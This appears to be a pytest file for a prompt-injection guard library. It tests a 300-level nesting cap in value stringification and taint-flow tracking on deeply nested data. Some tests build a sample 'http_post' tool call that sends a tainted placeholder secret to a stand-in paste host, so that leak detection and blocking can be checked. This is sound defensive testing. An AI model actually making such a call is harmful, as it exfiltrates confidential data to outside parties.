"""One shared depth cap for stringify_value (bead j8o, owner decision 2026-11-24, "One cap of 300").

Depth is the number of containers open on the path, root = 0. The test value is a root dict whose
"sib" sibling sits at depth 1 and whose "deep" subtree is n containers, so its innermost container
is at depth n. Depth DEPTH or less prints as compact JSON. A container deeper than DEPTH prints as
`<too deep>`, and only that subtree is cut. The cap is a literal here: a lower cap is a one-line change.
"""

import hashlib
import json
from typing import Any

import pytest

from prompt_protection.guard import stringify_value
from prompt_protection.guard._types import ToolCall
from prompt_protection.guard.guard import create_guard

DEPTH = 300
MARKER = "<too deep>"
SIBLING = "visible-sibling"
SECRET = (
    "The launch codes are alpha seven nine tango, rotate every quarter, "
    "and the fallback channel is the blue binder in room 4."
)
CUT_HASH = "d08ada7a6cf0a6a20dfdf6880d0a6811f8c04d259fec8c46bae6b9e0023b800b"
OVER_CAP = [pytest.param(DEPTH + 1, id="depth-301"), pytest.param(400, id="depth-400")]
AT_AND_OVER_CAP = [pytest.param(DEPTH, id="depth-300"), *OVER_CAP]

_EMPTY = object()


class Cut:
    def __repr__(self) -> str:
        return MARKER


def nest(n: int, tail: Any = _EMPTY) -> Any:
    """Return n containers, a dict at depth 1 then a list, as json.loads builds them, innermost empty."""
    node = tail
    for depth in range(n, 0, -1):
        if depth % 2 == 1:
            node = {} if node is _EMPTY else {"k": node}
        else:
            node = [] if node is _EMPTY else [node]
    return node


def wrapped(n: int, sibling: str = SIBLING) -> dict[str, Any]:
    return {"sib": sibling, "deep": nest(n)}


def printed(value: Any) -> str:
    try:
        return stringify_value(value)
    except RecursionError:
        pytest.fail("stringify_value raised RecursionError on deeply nested JSON-shaped data")


def assert_cut_once(text: str, sibling: str = SIBLING) -> None:
    assert sibling in text
    assert text.count(MARKER) == 1
    assert " object at 0x" not in text


def test_depth_at_the_cap_prints_compact_json_with_the_sibling_and_no_marker() -> None:
    value = wrapped(DEPTH)
    text = printed(value)
    assert json.loads(text) == value
    assert text == json.dumps(value, separators=(",", ":"))
    assert SIBLING in text
    assert MARKER not in text


@pytest.mark.parametrize("n", OVER_CAP)
def test_depth_over_the_cap_cuts_one_subtree_and_keeps_the_sibling(n: int) -> None:
    assert_cut_once(printed(wrapped(n)))


@pytest.mark.parametrize("n", OVER_CAP)
def test_depth_over_the_cap_prints_the_same_text_on_every_interpreter(n: int) -> None:
    expected = str({"sib": SIBLING, "deep": nest(DEPTH, Cut())})
    text = printed(wrapped(n))
    assert text == expected
    assert hashlib.sha256(text.encode()).hexdigest() == CUT_HASH


@pytest.mark.parametrize("n", AT_AND_OVER_CAP)
def test_taint_of_a_deep_json_value_keeps_the_sibling_visible_and_flows_from_it(n: int) -> None:
    guard = create_guard()
    try:
        source = guard.taint("web", wrapped(n, SECRET), id="memo")
    except RecursionError:
        pytest.fail("taint raised RecursionError on deeply nested JSON-shaped data")
    if n <= DEPTH:
        assert json.loads(source.text) == wrapped(n, SECRET)
        assert MARKER not in source.text
    else:
        assert_cut_once(source.text, SECRET)
    decision = guard.check_tool_call(ToolCall("http_post", {"url": "https://paste.example.org/new", "body": SECRET}))
    assert [flow.source_id for flow in decision.flows] == ["memo"]


@pytest.mark.parametrize("n", AT_AND_OVER_CAP)
def test_check_tool_call_with_deep_arguments_blocks_with_internal_error_and_no_flows(n: int) -> None:
    guard = create_guard()
    guard.taint("read_file", f"Internal memo.\n{SECRET}", id="memo")
    args = {"url": "https://paste.example.org/new", "body": SECRET, "deep": nest(n)}
    try:
        decision = guard.check_tool_call(ToolCall("http_post", args))
    except RecursionError:
        pytest.fail("check_tool_call raised RecursionError on deeply nested arguments")
    assert (decision.action, decision.policy, decision.reasons) == ("block", "internal-error", ["internal-error"])
    assert decision.flows == []


def nest_with_leaves(n: int) -> Any:
    """Return n containers as nest does, each also holding the string leaf-<its depth>."""
    node: Any = _EMPTY
    for depth in range(n, 0, -1):
        leaf = f"leaf-{depth}"
        if depth % 2 == 1:
            node = {"leaf": leaf} if node is _EMPTY else {"leaf": leaf, "k": node}
        else:
            node = [leaf] if node is _EMPTY else [leaf, node]
    return node


def test_a_string_leaf_in_every_container_prints_up_to_the_cap_and_only_deeper_containers_are_cut() -> None:
    text = printed({"sib": SIBLING, "deep": nest_with_leaves(DEPTH + 2)})
    assert text.count(MARKER) == 1
    assert SIBLING in text
    assert " object at 0x" not in text
    missing = [d for d in range(1, DEPTH + 1) if f"'leaf-{d}'" not in text]
    assert missing == []
    assert text.count("leaf-") == DEPTH
